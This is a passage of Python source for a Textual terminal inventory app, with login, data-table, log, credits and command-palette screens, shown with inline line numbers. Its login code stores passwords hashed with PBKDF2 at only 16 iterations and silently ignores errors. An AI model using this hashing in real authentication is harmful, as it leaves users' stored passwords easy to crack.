width: 1fr; 242 } 243 \u0026#34;\u0026#34;\u0026#34; 244 245 def __init__(self, status): 246 super().__init__() 247 self.status = status 248 self.status_alt_text = LoginStatus.login_status_alt_text.get(status) 249 250 def compose(self): 251 self.username_input = Input(placeholder=\u0026#34;Username\u0026#34;, restrict=r\u0026#34;^[^\\s]*$\u0026#34;) 252 self.password_input = Input(placeholder=self.status_alt_text.input_box, password=self.status_alt_text.password, restrict=r\u0026#34;^[^\\s]*$\u0026#34;) 253 with Container(): 254 yield Label(self.status_alt_text.label) 255 yield Label(\u0026#34;Username\u0026#34;) 256 yield self.username_input 257 yield Label(self.status_alt_text.input_box) 258 yield self.password_input 259 with Horizontal(): 260 yield Button(self.status_alt_text.button, id=self.status_alt_text.button_id) 261 yield Label(\u0026#34; \u0026#34;) 262 yield Button(\u0026#34;Cancel\u0026#34;, id=\u0026#34;cancel\u0026#34;, variant=\u0026#34;error\u0026#34;) 263 264 @on(Button.Pressed, \u0026#34;#login\u0026#34;) 265 def login_request(self): 266 try: 267 with open(\u0026#34;logininfo\u0026#34;, \u0026#39;r\u0026#39;, newline=\u0026#34;\u0026#34;) as logininfo: 268 reader = csv.reader(logininfo, delimiter=\u0026#39;:\u0026#39;) 269 hashdata = list(reader)[0] 270 if self.__login_hash(hashdata, self.username_input.value, self.password_input.value): 271 with open(\u0026#34;IMA.log\u0026#34;, \u0026#39;a\u0026#39;, newline=\u0026#34;\u0026#34;) as logfile: 272 logfile.write(f\u0026#34;Login at {asctime()}\\n\u0026#34;) 273 self.dismiss(LoginStatus.LOGIN_SUCCESS) 274 else: 275 with open(\u0026#34;IMA.log\u0026#34;, \u0026#39;a\u0026#39;, newline=\u0026#34;\u0026#34;) as logfile: 276 logfile.write(f\u0026#34;Attempt to login at {asctime()}\\n\u0026#34;) 277 278 except Exception: 279 pass 280 281 @on(Button.Pressed, \u0026#34;#first_time_login\u0026#34;) 282 def first_time_login_requsest(self): 283 try: 284 hashdata = self.__first_time_login_hash(self.username_input.value, self.password_input.value) 285 with open(\u0026#34;logininfo\u0026#34;, \u0026#39;w\u0026#39;, newline=\u0026#34;\u0026#34;) as logininfo: 286 writer = csv.writer(logininfo, delimiter=\u0026#39;:\u0026#39;) 287 writer.writerow(hashdata) 288 with open(\u0026#34;IMA.log\u0026#34;, \u0026#39;a\u0026#39;, newline=\u0026#34;\u0026#34;) as logfile: 289 logfile.write(f\u0026#34;Sign up at {asctime()}\\n\u0026#34;) 290 self.dismiss(LoginStatus.LOGIN_SUCCESS) 291 292 except Exception: 293 pass 294 295 @on(Button.Pressed, \u0026#34;#change_password\u0026#34;) 296 def change_password_request(self): 297 try: 298 with open(\u0026#34;logininfo\u0026#34;, \u0026#39;r\u0026#39;, newline=\u0026#34;\u0026#34;) as logininfo: 299 reader = csv.reader(logininfo, delimiter=\u0026#39;:\u0026#39;) 300 init_hashdata = list(reader)[0] 301 hashdata = self.__change_password_hash(init_hashdata, self.username_input.value, self.password_input.value) 302 if hashdata: 303 with open(\u0026#34;logininfo\u0026#34;, \u0026#39;w\u0026#39;, newline=\u0026#34;\u0026#34;) as logininfo: 304 writer = csv.writer(logininfo, delimiter=\u0026#39;:\u0026#39;) 305 writer.writerow(hashdata) 306 with open(\u0026#34;IMA.log\u0026#34;, \u0026#39;a\u0026#39;, newline=\u0026#34;\u0026#34;) as logfile: 307 logfile.write(f\u0026#34;Change password at {asctime()}\\n\u0026#34;) 308 self.dismiss(LoginStatus.LOGIN_SUCCESS) 309 310 except Exception: 311 pass 312 313 @on(Button.Pressed, \u0026#34;#cancel\u0026#34;) 314 def cancel_request(self): 315 if self.status != LoginStatus.REQUEST_CHANGE_PASSWORD: 316 self.dismiss(LoginStatus.EXIT_PROGRAM) 317 else: 318 self.dismiss() 319 320 def __login_hash(self, hashdata, *args): 321 calcdata = [] 322 pbkdf2data = [] 323 inputdata = list(args) 324 for iter in range(2): 325 salt = binascii.unhexlify(hashdata[iter * 2]) 326 pbkdf2data.append(hashdata[iter * 2 + 1]) 327 calcdata.append(binascii.hexlify(hashlib.pbkdf2_hmac(\u0026#34;sha256\u0026#34;, inputdata[iter].encode(), salt, 16)).decode()) 328 return calcdata == pbkdf2data 329 330 def __first_time_login_hash(self, *args): 331 hashdata = [] 332 for raw in args: 333 salt = urandom(16) 334 hashdata.append(binascii.hexlify(salt).decode()) 335 hashdata.append(binascii.hexlify(hashlib.pbkdf2_hmac(\u0026#34;sha256\u0026#34;, raw.encode(), salt, 16)).decode()) 336 return hashdata 337 338 def __change_password_hash(self, init_hashdata, *args): 339 salt = binascii.unhexlify(init_hashdata[0]) 340 if init_hashdata[1] == binascii.hexlify(hashlib.pbkdf2_hmac(\u0026#34;sha256\u0026#34;, self.username_input.value.encode(), salt, 16)).decode(): 341 hashdata = [] 342 for raw in args: 343 salt = urandom(16) 344 hashdata.append(binascii.hexlify(salt).decode()) 345 hashdata.append(binascii.hexlify(hashlib.pbkdf2_hmac(\u0026#34;sha256\u0026#34;, raw.encode(), salt, 16)).decode()) 346 return hashdata 347 else: 348 return False 349 350 351class DataTableScreen(Screen): 352 353 DEFAULT_CSS = \u0026#34;\u0026#34;\u0026#34; 354 DataTableScreen { 355 align: center middle; 356 } 357 358 DataTableScreen \u0026gt; Container { 359 align: center top; 360 width: auto; 361 margin: 1; 362 } 363 364 DataTableScreen \u0026gt; Container \u0026gt; DataTable { 365 align: center top; 366 width: auto; 367 } 368 \u0026#34;\u0026#34;\u0026#34; 369 370 TITLE = \u0026#34;Item Management App\u0026#34; 371 SUB_TITLE = \u0026#34;Data Table View\u0026#34; 372 BINDINGS = [ 373 Binding(key=\u0026#39;n\u0026#39;, action=\u0026#34;sort_by_name\u0026#34;, description=\u0026#34;Sort By Name\u0026#34;, key_display=\u0026#39;N\u0026#39;, priority=True), 374 Binding(key=\u0026#39;N\u0026#39;, action=\u0026#34;sort_by_name\u0026#34;, show=False, priority=True), 375 Binding(key=\u0026#39;u\u0026#39;, action=\u0026#34;sort_by_unit_price\u0026#34;, description=\u0026#34;Sort By Unit Price\u0026#34;, key_display=\u0026#39;U\u0026#39;), 376 Binding(key=\u0026#39;U\u0026#39;, action=\u0026#34;sort_by_unit_price\u0026#34;, show=False), 377 Binding(key=\u0026#39;y\u0026#39;, action=\u0026#34;sort_by_quantity\u0026#34;, description=\u0026#34;Sort By Quantity\u0026#34;, key_display=\u0026#39;Y\u0026#39;), 378 Binding(key=\u0026#39;Y\u0026#39;, action=\u0026#34;sort_by_quantity\u0026#34;, show=False), 379 Binding(key=\u0026#39;e\u0026#39;, action=\u0026#34;sort_by_section\u0026#34;, description=\u0026#34;Sort By Section\u0026#34;, key_display=\u0026#39;E\u0026#39;, priority=True), 380 Binding(key=\u0026#39;E\u0026#39;, action=\u0026#34;sort_by_section\u0026#34;, show=False, priority=True), 381 Binding(key=\u0026#39;i\u0026#39;, action=\u0026#34;sort_by_id\u0026#34;, description=\u0026#34;Sort By ID\u0026#34;, key_display=\u0026#39;I\u0026#39;), 382 Binding(key=\u0026#39;I\u0026#39;, action=\u0026#34;sort_by_id\u0026#34;, show=False), 383 Binding(key=\u0026#39;q\u0026#39;, action=\u0026#34;quit\u0026#34;, description=\u0026#34;Quit\u0026#34;, key_display=\u0026#39;Q\u0026#39;), 384 Binding(key=\u0026#39;Q\u0026#39;, action=\u0026#34;quit\u0026#34;, show=False), 385 Binding(key=\u0026#39;a\u0026#39;, action=\u0026#34;new_item\u0026#34;, description=\u0026#34;New\u0026#34;, key_display=\u0026#39;A\u0026#39;, show=False), 386 Binding(key=\u0026#39;s\u0026#39;, action=\u0026#34;save_data\u0026#34;, description=\u0026#34;Save\u0026#34;, key_display=\u0026#39;S\u0026#39;, show=False), 387 Binding(key=\u0026#39;v\u0026#39;, action=\u0026#34;toggle_datatable_view\u0026#34;, description=\u0026#34;Data Table View\u0026#34;, key_display=\u0026#39;V\u0026#39;, show=False), 388 Binding(key=\u0026#39;c\u0026#39;, action=\u0026#34;change_password\u0026#34;, description=\u0026#34;Change Password\u0026#34;, key_display=\u0026#39;C\u0026#39;, show=False), 389 Binding(key=\u0026#39;l\u0026#39;, action=\u0026#34;read_log_file\u0026#34;, description=\u0026#34;Read Log File\u0026#34;, key_display=\u0026#39;L\u0026#39;, show=False), 390 Binding(key=\u0026#39;t\u0026#39;, action=\u0026#34;credits\u0026#34;, description=\u0026#34;Credits\u0026#34;, key_display=\u0026#39;T\u0026#39;, show=False), 391 Binding(key=\u0026#39;A\u0026#39;, action=\u0026#34;new_item\u0026#34;, show=False), 392 Binding(key=\u0026#39;S\u0026#39;, action=\u0026#34;save_data\u0026#34;, show=False), 393 Binding(key=\u0026#39;V\u0026#39;, action=\u0026#34;toggle_datatable_view\u0026#34;, show=False), 394 Binding(key=\u0026#39;C\u0026#39;, action=\u0026#34;change_password\u0026#34;, show=False), 395 Binding(key=\u0026#39;L\u0026#39;, action=\u0026#34;read_log_file\u0026#34;, show=False), 396 Binding(key=\u0026#39;T\u0026#39;, action=\u0026#34;credits\u0026#34;, show=False), 397 ] 398 399 cursors = cycle([\u0026#34;cell\u0026#34;, \u0026#34;row\u0026#34;, \u0026#34;column\u0026#34;]) 400 current_sorts = set() 401 402 def __init__(self, data): 403 super().__init__() 404 self.rows = data 405 406 def on_mount(self) -\u0026gt; None: 407 table = self.query_one(DataTable) 408 for col in self.rows[0]: 409 table.add_column(col, key=col) 410 table.add_rows(self.rows[1:]) 411 table.zebra_stripes = True 412 413 def compose(self): 414 yield Header(show_clock=True) 415 yield Footer() 416 with Container(): 417 yield DataTable() 418 419 def sort_reverse(self, sort_type): 420 reverse = sort_type in self.current_sorts 421 if reverse: 422 self.current_sorts.remove(sort_type) 423 else: 424 self.current_sorts.add(sort_type) 425 return reverse 426 427 def action_sort_by_name(self): 428 table = self.query_one(DataTable) 429 table.sort( 430 \u0026#34;Name\u0026#34;, 431 key=lambda name: name, 432 reverse=self.sort_reverse(\u0026#34;Name\u0026#34;) 433 ) 434 435 def action_sort_by_unit_price(self): 436 table = self.query_one(DataTable) 437 table.sort( 438 \u0026#34;Unit Price\u0026#34;, 439 key=lambda unit_price: float(unit_price), 440 reverse=self.sort_reverse(\u0026#34;Unit Price\u0026#34;) 441 ) 442 443 def action_sort_by_quantity(self): 444 table = self.query_one(DataTable) 445 table.sort( 446 \u0026#34;Quantity\u0026#34;, 447 key=lambda qty: int(qty), 448 reverse=self.sort_reverse(\u0026#34;Quantity\u0026#34;) 449 ) 450 451 def action_sort_by_section(self): 452 table = self.query_one(DataTable) 453 table.sort( 454 \u0026#34;Section\u0026#34;, 455 key=lambda section: section, 456 reverse=self.sort_reverse(\u0026#34;Section\u0026#34;) 457 ) 458 459 def action_sort_by_id(self): 460 table = self.query_one(DataTable) 461 table.sort( 462 \u0026#34;ID\u0026#34;, 463 key=lambda id_num: id_num, 464 reverse=self.sort_reverse(\u0026#34;ID\u0026#34;) 465 ) 466 467 def action_quit(self): 468 self.dismiss() 469 470 def key_space(self): 471 table = self.query_one(DataTable) 472 table.cursor_type = next(self.cursors) 473 474 475class LogScreen(Screen): 476 477 DEFAULT_CSS = \u0026#34;\u0026#34;\u0026#34; 478 LogScreen { 479 align: center middle; 480 } 481 482 LogScreen \u0026gt; Container { 483 width: 90%; 484 height: 90%; 485 } 486 487 LogScreen \u0026gt; Container \u0026gt; Button { 488 dock: bottom; 489 } 490 \u0026#34;\u0026#34;\u0026#34; 491 492 TITLE = \u0026#34;Item Management App\u0026#34; 493 SUB_TITLE = \u0026#34;View Log File\u0026#34; 494 BINDINGS = [ 495 Binding(key=\u0026#39;a\u0026#39;, action=\u0026#34;new_item\u0026#34;, description=\u0026#34;New\u0026#34;, key_display=\u0026#39;A\u0026#39;, show=False), 496 Binding(key=\u0026#39;s\u0026#39;, action=\u0026#34;save_data\u0026#34;, description=\u0026#34;Save\u0026#34;, key_display=\u0026#39;S\u0026#39;, show=False), 497 Binding(key=\u0026#39;v\u0026#39;, action=\u0026#34;toggle_datatable_view\u0026#34;, description=\u0026#34;Data Table View\u0026#34;, key_display=\u0026#39;V\u0026#39;, show=False), 498 Binding(key=\u0026#39;c\u0026#39;, action=\u0026#34;change_password\u0026#34;, description=\u0026#34;Change Password\u0026#34;, key_display=\u0026#39;C\u0026#39;, show=False), 499 Binding(key=\u0026#39;l\u0026#39;, action=\u0026#34;read_log_file\u0026#34;, description=\u0026#34;Read Log File\u0026#34;, key_display=\u0026#39;L\u0026#39;, show=False), 500 Binding(key=\u0026#39;t\u0026#39;, action=\u0026#34;credits\u0026#34;, description=\u0026#34;Credits\u0026#34;, key_display=\u0026#39;T\u0026#39;, show=False), 501 Binding(key=\u0026#39;A\u0026#39;, action=\u0026#34;new_item\u0026#34;, show=False), 502 Binding(key=\u0026#39;S\u0026#39;, action=\u0026#34;save_data\u0026#34;, show=False), 503 Binding(key=\u0026#39;V\u0026#39;, action=\u0026#34;toggle_datatable_view\u0026#34;, show=False), 504 Binding(key=\u0026#39;C\u0026#39;, action=\u0026#34;change_password\u0026#34;, show=False), 505 Binding(key=\u0026#39;L\u0026#39;, action=\u0026#34;read_log_file\u0026#34;, show=False), 506 Binding(key=\u0026#39;T\u0026#39;, action=\u0026#34;credits\u0026#34;, show=False), 507 Binding(key=\u0026#39;q\u0026#39;, action=\u0026#34;quit\u0026#34;, description=\u0026#34;Quit\u0026#34;, key_display=\u0026#39;Q\u0026#39;), 508 Binding(key=\u0026#39;Q\u0026#39;, action=\u0026#34;quit\u0026#34;, show=False) 509 ] 510 511 def on_mount(self): 512 with open(\u0026#34;IMA.log\u0026#34;, \u0026#39;r\u0026#39;, newline=\u0026#34;\u0026#34;) as log_file: 513 log = log_file.read() 514 log_richlog = self.query_one(RichLog) 515 log_richlog.write(log) 516 517 def compose(self): 518 yield Footer() 519 yield Header(show_clock=True) 520 with Container(): 521 yield RichLog() 522 523 def action_quit(self): 524 self.dismiss() 525 526 527class CreditsScreen(Screen): 528 529 DEFAULT_CSS = \u0026#34;\u0026#34;\u0026#34; 530 CreditsScreen { 531 align: center middle; 532 } 533 534 CreditsScreen \u0026gt; Center { 535 width: 90%; 536 height: 90%; 537 } 538 539 CreditsScreen \u0026gt; Center \u0026gt; Label { 540 align: center middle; 541 } 542 \u0026#34;\u0026#34;\u0026#34; 543 544 TITLE = \u0026#34;Item Management App\u0026#34; 545 SUB_TITLE = \u0026#34;Credits\u0026#34; 546 BINDINGS = [ 547 Binding(key=\u0026#39;a\u0026#39;, action=\u0026#34;new_item\u0026#34;, description=\u0026#34;New\u0026#34;, key_display=\u0026#39;A\u0026#39;, show=False), 548 Binding(key=\u0026#39;s\u0026#39;, action=\u0026#34;save_data\u0026#34;, description=\u0026#34;Save\u0026#34;, key_display=\u0026#39;S\u0026#39;, show=False), 549 Binding(key=\u0026#39;v\u0026#39;, action=\u0026#34;toggle_datatable_view\u0026#34;, description=\u0026#34;Data Table View\u0026#34;, key_display=\u0026#39;V\u0026#39;, show=False), 550 Binding(key=\u0026#39;c\u0026#39;, action=\u0026#34;change_password\u0026#34;, description=\u0026#34;Change Password\u0026#34;, key_display=\u0026#39;C\u0026#39;, show=False), 551 Binding(key=\u0026#39;l\u0026#39;, action=\u0026#34;read_log_file\u0026#34;, description=\u0026#34;Read Log File\u0026#34;, key_display=\u0026#39;L\u0026#39;, show=False), 552 Binding(key=\u0026#39;t\u0026#39;, action=\u0026#34;credits\u0026#34;, description=\u0026#34;Credits\u0026#34;, key_display=\u0026#39;T\u0026#39;, show=False), 553 Binding(key=\u0026#39;A\u0026#39;, action=\u0026#34;new_item\u0026#34;, show=False), 554 Binding(key=\u0026#39;S\u0026#39;, action=\u0026#34;save_data\u0026#34;, show=False), 555 Binding(key=\u0026#39;V\u0026#39;, action=\u0026#34;toggle_datatable_view\u0026#34;, show=False), 556 Binding(key=\u0026#39;C\u0026#39;, action=\u0026#34;change_password\u0026#34;, show=False), 557 Binding(key=\u0026#39;L\u0026#39;, action=\u0026#34;read_log_file\u0026#34;, show=False), 558 Binding(key=\u0026#39;T\u0026#39;, action=\u0026#34;credits\u0026#34;, show=False), 559 Binding(key=\u0026#39;q\u0026#39;, action=\u0026#34;quit\u0026#34;, description=\u0026#34;Quit\u0026#34;, key_display=\u0026#39;Q\u0026#39;), 560 Binding(key=\u0026#39;Q\u0026#39;, action=\u0026#34;quit\u0026#34;, show=False) 561 ] 562 563 banner = r\u0026#34;\u0026#34;\u0026#34; 564 ___ _ __ __ _ _ 565|_ _| |_ ___ _ __ ___ | \\/ | __ _ _ __ __ _ __ _ ___ _ __ ___ ___ _ __ | |_ / \\ _ __ _ __ 566 | || __/ _ \\ \u0026#39;_ ` _ \\ | |\\/| |/ _` | \u0026#39;_ \\ / _` |/ _` |/ _ \\ \u0026#39;_ ` _ \\ / _ \\ \u0026#39;_ \\| __| / _ \\ | \u0026#39;_ \\| \u0026#39;_ \\ 567 | || || __/ | | | | | | | | | (_| | | | | (_| | (_| | __/ | | | | | __/ | | | |_ / ___ \\| |_) | |_) | 568|___|\\__\\___|_| |_| |_| |_| |_|\\__,_|_| |_|\\__,_|\\__, |\\___|_| |_| |_|\\___|_| |_|\\__| /_/ \\_\\ .__/| .__/ 569 |___/ |_| |_| 570 571 572 573 574 _ _ _ _____ _ _ ___ ____ ____ 575 / \\ | | | |_ _| | | |/ _ \\| _ \\/ ___| _ 576 / _ \\| | | | | | | |_| | | | | |_) \\___ \\ (_) 577 / ___ \\ |_| | | | | _ | |_| | _ \u0026lt; ___) | _ 578/_/ \\_\\___/ |_| |_| |_|\\___/|_| \\_\\____/ (_) 579 580 581 _ _ ______ 582 | | (_) |__ / |__ ___ _ __ __ _ _ _ __ _ ___ 583 | | | | / /| \u0026#39;_ \\ / _ \\| \u0026#39;_ \\ / _` | | | |/ _` |/ _ \\ 584 | |___| | / /_| | | | (_) | | | | (_| | |_| | (_| | (_) | 585 |_____|_| /____|_| |_|\\___/|_| |_|\\__, |\\__, |\\__,_|\\___/ 586 |___/ |___/ 587 588 589 _ _ __ __ _ 590 | | (_) \\ \\ / /__ _ __ ___| |__ ___ 591 | | | | \\ \\ /\\ / / _ \\ \u0026#39;_ \\|_ / \u0026#39;_ \\ / _ \\ 592 | |___| | \\ V V / __/ | | |/ /| | | | __/ 593 |_____|_| \\_/\\_/ \\___|_| |_/___|_| |_|\\___| 594 595 596 _ _ _ _ _ 597 | | (_) | | | | __ _ ___ __| | ___ _ __ __ _ 598 | | | | | |_| |/ _` |/ _ \\ / _` |/ _ \\| \u0026#39;_ \\ / _` | 599 | |___| | | _ | (_| | (_) | (_| | (_) | | | | (_| | 600 |_____|_| |_| |_|\\__,_|\\___/ \\__,_|\\___/|_| |_|\\__, | 601 |___/ 602 \u0026#34;\u0026#34;\u0026#34; 603 604 def compose(self): 605 yield Header(show_clock=True) 606 yield Footer() 607 with Center(): 608 yield Label(self.banner) 609 610 def action_quit(self): 611 self.dismiss() 612 613 614class SourceCodeScreen(Screen): 615 616 DEFAULT_CSS = \u0026#34;\u0026#34;\u0026#34; 617 SourceCodeScreen { 618 align: center middle; 619 } 620 621 SourceCodeScreen \u0026gt; Container { 622 align: center middle; 623 height: auto; 624 width: 100%; 625 } 626 627 SourceCodeScreen \u0026gt; Container \u0026gt; RichLog { 628 width: auto; 629 } 630 \u0026#34;\u0026#34;\u0026#34; 631 632 BINDINGS = [ 633 Binding(key=\u0026#39;a\u0026#39;, action=\u0026#34;new_item\u0026#34;, description=\u0026#34;New\u0026#34;, key_display=\u0026#39;A\u0026#39;, show=False), 634 Binding(key=\u0026#39;s\u0026#39;, action=\u0026#34;save_data\u0026#34;, description=\u0026#34;Save\u0026#34;, key_display=\u0026#39;S\u0026#39;, show=False), 635 Binding(key=\u0026#39;v\u0026#39;, action=\u0026#34;toggle_datatable_view\u0026#34;, description=\u0026#34;Data Table View\u0026#34;, key_display=\u0026#39;V\u0026#39;, show=False), 636 Binding(key=\u0026#39;c\u0026#39;, action=\u0026#34;change_password\u0026#34;, description=\u0026#34;Change Password\u0026#34;, key_display=\u0026#39;C\u0026#39;, show=False), 637 Binding(key=\u0026#39;l\u0026#39;, action=\u0026#34;read_log_file\u0026#34;, description=\u0026#34;Read Log File\u0026#34;, key_display=\u0026#39;L\u0026#39;, show=False), 638 Binding(key=\u0026#39;t\u0026#39;, action=\u0026#34;credits\u0026#34;, description=\u0026#34;Credits\u0026#34;, key_display=\u0026#39;T\u0026#39;, show=False), 639 Binding(key=\u0026#39;A\u0026#39;, action=\u0026#34;new_item\u0026#34;, show=False), 640 Binding(key=\u0026#39;S\u0026#39;, action=\u0026#34;save_data\u0026#34;, show=False), 641 Binding(key=\u0026#39;V\u0026#39;, action=\u0026#34;toggle_datatable_view\u0026#34;, show=False), 642 Binding(key=\u0026#39;C\u0026#39;, action=\u0026#34;change_password\u0026#34;, show=False), 643 Binding(key=\u0026#39;L\u0026#39;, action=\u0026#34;read_log_file\u0026#34;, show=False), 644 Binding(key=\u0026#39;T\u0026#39;, action=\u0026#34;credits\u0026#34;, show=False), 645 Binding(key=\u0026#39;q\u0026#39;, action=\u0026#34;quit\u0026#34;, description=\u0026#34;Quit\u0026#34;, key_display=\u0026#39;Q\u0026#39;), 646 Binding(key=\u0026#39;Q\u0026#39;, action=\u0026#34;quit\u0026#34;, show=False) 647 ] 648 649 def __init__(self, file_size): 650 super().__init__() 651 self.file_size = file_size 652 653 def on_mount(self): 654 with open(\u0026#34;ItemManagementApp.py\u0026#34;, \u0026#39;r\u0026#39;, newline=\u0026#34;\u0026#34;) as code_file: 655 code = code_file.read() 656 code_richlog = self.query_one(RichLog) 657 code_richlog.write(Syntax(code, \u0026#34;python\u0026#34;, indent_guides=True, code_width=160, line_numbers=True), scroll_end=True) 658 659 def compose(self): 660 yield Header(show_clock=True) 661 yield Footer() 662 with Container(): 663 yield RichLog(highlight=True, markup=True) 664 yield Label(f\u0026#34;Total {self.file_size} KiB.\u0026#34;) 665 666 def action_quit(self): 667 self.dismiss() 668 669 670class GDNModalScreen(ModalScreen): 671 672 DEFAULT_CSS = \u0026#34;\u0026#34;\u0026#34; 673 GDNModalScreen { 674 align: center middle; 675 } 676 677 GDNModalScreen \u0026gt; Container { 678 border: thick $background; 679 background: $boost; 680 width: 25%; 681 height: 25%; 682 } 683 684 GDNModalScreen \u0026gt; Container \u0026gt; Label { 685 margin: 1 686 } 687 688 GDNModalScreen \u0026gt; Container \u0026gt; #url { 689 background: pink; 690 } 691 692 GDNModalScreen \u0026gt; Container \u0026gt; Button { 693 width: 100%; 694 height: auto; 695 dock: bottom; 696 margin: 1; 697 } 698 \u0026#34;\u0026#34;\u0026#34; 699 700 def compose(self): 701 with Container(): 702 yield Label(\u0026#34;Please visit my blog at\u0026#34;) 703 yield Label(\u0026#34;https://jackgdn.github.io\u0026#34;, id=\u0026#34;url\u0026#34;) 704 yield Button(\u0026#34;OK!\u0026#34;, variant=\u0026#34;success\u0026#34;) 705 706 def on_button_pressed(self): 707 self.dismiss() 708 709 710class ItemWidget(Widget): 711 712 DEFAULT_CSS = \u0026#34;\u0026#34;\u0026#34; 713 ItemWidget { 714 align: center middle; 715 height: 3; 716 margin: 1; 717 } 718 \u0026#34;\u0026#34;\u0026#34; 719 720 name = reactive(\u0026#34;\u0026#34;) 721 unit_price = reactive(\u0026#34;\u0026#34;) 722 quantity = reactive(\u0026#34;\u0026#34;) 723 section = reactive(\u0026#34;\u0026#34;) 724 id_number = reactive(\u0026#34;\u0026#34;) 725 726 class Edit(Message): 727 def __init__(self, item): 728 super().__init__() 729 self.item = item 730 731 class Delete(Message): 732 def __init__(self, item): 733 super().__init__() 734 self.item = item 735 736 def __init__(self): 737 super().__init__() 738 self.name_label = Label(id=\u0026#34;name\u0026#34;) 739 self.unit_price_label = Label(id=\u0026#34;unit_price\u0026#34;) 740 self.quantity_label = Label(id=\u0026#34;quantity\u0026#34;) 741 self.section_label = Label(id=\u0026#34;section\u0026#34;) 742 self.id_number_label = Label(id=\u0026#34;ID\u0026#34;) 743 744 def compose(self): 745 with Horizontal(): 746 yield Button(\u0026#34;Edit\u0026#34;, id=\u0026#34;edit\u0026#34;, variant=\u0026#34;success\u0026#34;) 747 yield Label(\u0026#34; \u0026#34;) 748 yield Button(\u0026#34;Delete\u0026#34;, id=\u0026#34;delete\u0026#34;, variant=\u0026#34;error\u0026#34;) 749 yield Label(\u0026#34; \u0026#34;) 750 with Container(): 751 yield Label(Text(\u0026#34;Name: \u0026#34;, style=\u0026#34;italic\u0026#34;)) 752 yield self.name_label 753 with Container(): 754 yield Label(Text(\u0026#34;Unit Price: \u0026#34;, style=\u0026#34;italic\u0026#34;)) 755 yield self.unit_price_label 756 with Container(): 757 yield Label(Text(\u0026#34;Qty.: \u0026#34;, style=\u0026#34;italic\u0026#34;)) 758 yield self.quantity_label 759 with Container(): 760 yield Label(Text(\u0026#34;Section: \u0026#34;, style=\u0026#34;italic\u0026#34;)) 761 yield self.section_label 762 with Container(): 763 yield Label(Text(\u0026#34;ID: \u0026#34;, style=\u0026#34;italic\u0026#34;)) 764 yield self.id_number_label 765 766 def watch_name(self, name): 767 self.name_label.update(name) 768 769 def watch_unit_price(self, unit_price): 770 self.unit_price_label.update(unit_price) 771 772 def watch_quantity(self, quantity): 773 self.quantity_label.update(quantity) 774 775 def watch_section(self, section): 776 try: 777 self.section_label.update(section) 778 779 except Exception: 780 self.post_message(self.Delete(self)) 781 782 def watch_id_number(self, id_number): 783 self.id_number_label.update(id_number) 784 785 @on(Button.Pressed, \u0026#34;#edit\u0026#34;) 786 def edit_request(self): 787 self.post_message(self.Edit(self)) 788 789 @on(Button.Pressed, \u0026#34;#delete\u0026#34;) 790 def delete_request(self): 791 self.post_message(self.Delete(self)) 792 793 794class CommandProvider(Provider): 795 796 async def search(self, query): 797 app = self.app 798 commands = { 799 \u0026#34;Save Data\u0026#34;: (\u0026#34;Save data NOW in case you forget to do so.\u0026#34;, app.action_save_data), 800 \u0026#34;Change Password\u0026#34;: (\u0026#34;Change your password as you want.\u0026#34;, app.action_change_password), 801 \u0026#34;Toggle Light/Dark Mode\u0026#34;: (\u0026#34;Your eyes are valuable.\u0026#34;, app.action_toggle_light_dark_mode), 802 \u0026#34;Exit Program\u0026#34;: (\u0026#34;Say goodbye to IMA.\u0026#34;, app.exit), 803 \u0026#34;View Source Code\u0026#34;: (\u0026#34;Incredible!\u0026#34;, app.view_source_code), 804 \u0026#34;Visit Author\u0026#39;s Blog\u0026#34;: (\u0026#34;Welcome to visit author\u0026#39;s blog @ https://jackgdn.github.io\u0026#34;, app.visit_my_blog) 805 } 806 807 matcher = self.matcher(query) 808 for command in list(commands.keys()): 809 score = matcher.match(command) 810 if score \u0026gt; 0: 811 yield Hit( 812 score, 813 matcher.highlight(command), 814 commands[command][1], 815 help=commands[command][0] 816 ) 817 818 819class ExceptionAppCommandProvider(Provider): 820 821 async def search(self, query): 822 app = self.app 823 commands = { 824 \u0026#34;Toggle Light/Dark Mode\u0026#34;: (\u0026#34;Your eyes are valuable.\u0026#34;, app.action_toggle_light_dark_mode), 825 \u0026#34;Exit Program\u0026#34;: (\u0026#34;Say goodbye to IMA.\u0026#34;, app.exit), 826 \u0026#34;View Source Code\u0026#34;: (\u0026#34;Incredible!\u0026#34;, app.view_source_code), 827 \u0026#34;Visit Author\u0026#39;s Blog\u0026#34;: (\u0026#34;Welcome to visit author\u0026#39;s blog @ https://jackgdn.github.io\u0026#34;, app.visit_my_blog) 828 } 829 830 matcher = self.matcher(query) 831 for command in list(commands.keys()): 832 score = matcher.match(command) 833 if score \u0026gt; 0: 834 yield Hit( 835 score, 836 matcher.highlight(command), 837 commands[command][1], 838 help=commands[command][0] 839 ) 840 841 842class ItemApp(App): 843 844 COMMANDS = {CommandProvider} 845 BINDINGS = [ 846 Binding(key=\u0026#39;a\u0026#39;, action=\u0026#34;new_item\u0026#34;, description=\u0026#34;New\u0026#34;, key_display=\u0026#39;A\u0026#39;), 847 Binding(key=\u0026#39;s\u0026#39;, action=\u0026#34;save_data\u0026#34;, description=\u0026#34;Save\u0026#34;, key_display=\u0026#39;S\u0026#39;), 848 Binding(key=\u0026#39;v\u0026#39;, action=\u0026#34;toggle_datatable_view\u0026#34;, description=\u0026#34;Data Table View\u0026#34;, key_display=\u0026#39;V\u0026#39;), 849 Binding(key=\u0026#39;c\u0026#39;, action=\u0026#34;change_password\u0026#34;, description=\u0026#34;Change Password\u0026#34;, key_display=\u0026#39;C\u0026#39;), 850 Binding(key=\u0026#39;l\u0026#39;, action=\u0026#34;read_log_file\u0026#34;, description=\u0026#34;Read Log File\u0026#34;, key_display=\u0026#39;L\u0026#39;), 851 Binding(key=\u0026#39;d\u0026#39;, action=\u0026#34;toggle_light_dark_mode\u0026#34;, description=\u0026#34;Light/Dark Mode\u0026#34;, key_display=\u0026#39;D\u0026#39;), 852 Binding(key=\u0026#39;t\u0026#39;, action=\u0026#34;credits\u0026#34;, description=\u0026#34;Credits\u0026#34;, key_display=\u0026#39;T\u0026#39;), 853 Binding(key=\u0026#39;A\u0026#39;, action=\u0026#34;new_item\u0026#34;, show=False), 854 Binding(key=\u0026#39;S\u0026#39;, action=\u0026#34;save_data\u0026#34;, show=False), 855 Binding(key=\u0026#39;V\u0026#39;, action=\u0026#34;toggle_datatable_view\u0026#34;, show=False), 856 Binding(key=\u0026#39;C\u0026#39;, action=\u0026#34;change_password\u0026#34;, show=False), 857 Binding(key=\u0026#39;L\u0026#39;, action=\u0026#34;read_log_file\u0026#34;, show=False), 858 Binding(key=\u0026#39;D\u0026#39;, action=\u0026#34;toggle_light_dark_mode\u0026#34;, show=False), 859 Binding(key=\u0026#39;T\u0026#39;, action=\u0026#34;credits\u0026#34;, 